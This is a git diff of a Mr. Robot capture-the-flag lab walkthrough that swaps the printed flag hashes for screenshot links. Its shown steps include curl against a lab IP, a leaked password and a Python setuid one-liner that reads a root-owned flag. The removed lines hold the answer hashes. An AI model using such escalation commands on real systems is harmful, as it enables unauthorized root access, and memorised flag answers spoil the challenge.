@@ -1,3 +1,5 @@
+![Congrats](../assets/screenshots/mr%20robot/mr%20robot%20congrats.jpg)
+
 # Mr. Robot CTF 
 
 Step by Step Method to Get All 3 Flags:
@@ -35,7 +37,8 @@ key-1-of-3.txt
 ```bash
 curl http://10.48.148.118/key-1-of-3.txt
 ```
-**FIRST FLAG:** `073403c8a58a1f80d943455fb30724b9`
+**FIRST FLAG:** 
+![First Flag](../assets/screenshots/mr%20robot/firstflag%20mrrobot.jpg)
 
 ```bash
 curl -O http://10.48.148.118/fsocity.dic
@@ -126,7 +129,8 @@ Password: abcdefghijklmnopqrstuvwxyz
 ```bash
 cat /home/robot/key-2-of-3.txt
 ```
-**SECOND FLAG:** `822c73956184f694993bede3eb39f959`
+**SECOND FLAG:** 
+![Second Flag](../assets/screenshots/mr%20robot/secondflag%20mrrobot.jpg)
 
 ## Step 7: Privilege Escalation to Root
 ```bash
@@ -144,9 +148,10 @@ Exploited using Python (since nmap interactive had issues):
 python3 -c 'import os; os.setuid(0); os.system("cat /root/key-3-of-3.txt")'
 ```
 
-**THIRD FLAG:** `04787ddef27c3dee1ee161b21670b4e4`
+**THIRD FLAG:** 
+![Third Flag](../assets/screenshots/mr%20robot/thirdflag%20mrrobot.jpg)
 
 ## Final Flags
-- Flag 1: `073403c8a58a1f80d943455fb30724b9`
-- Flag 2: `822c73956184f694993bede3eb39f959`
-- Flag 3: `04787ddef27c3dee1ee161b21670b4e4`
+- Flag 1: ![First Flag](../assets/screenshots/mr%20robot/firstflag%20mrrobot.jpg)
+- Flag 2: ![Second Flag](../assets/screenshots/mr%20robot/secondflag%20mrrobot.jpg)
+- Flag 3: ![Third Flag](../assets/screenshots/mr%20robot/thirdflag%20mrrobot.jpg)
